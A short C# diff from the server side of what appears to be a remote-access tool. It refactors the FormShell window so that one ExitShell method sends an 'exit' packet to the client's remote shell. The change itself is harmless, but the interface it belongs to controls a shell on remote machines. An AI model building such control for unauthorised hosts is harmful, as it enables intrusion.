@@ -36,6 +36,7 @@ namespace Server.Forms
                 }
                 if (textBox1.Text == "exit".ToLower())
                 {
+                    ExitShell();
                     this.Close();
                 }
                 MsgPack msgpack = new MsgPack();
@@ -48,10 +49,8 @@ namespace Server.Forms
 
         private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
-            msgpack.ForcePathObject("WriteInput").AsString = "exit";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            ExitShell();
+
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
@@ -63,9 +62,12 @@ namespace Server.Forms
             catch { this.Close(); }
         }
 
-        private void Label1_Click(object sender, EventArgs e)
+        private void ExitShell()
         {
-            Process.Start("https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands");
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "shellWriteInput";
+            msgpack.ForcePathObject("WriteInput").AsString = "exit";
+            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
         }
     }
 }
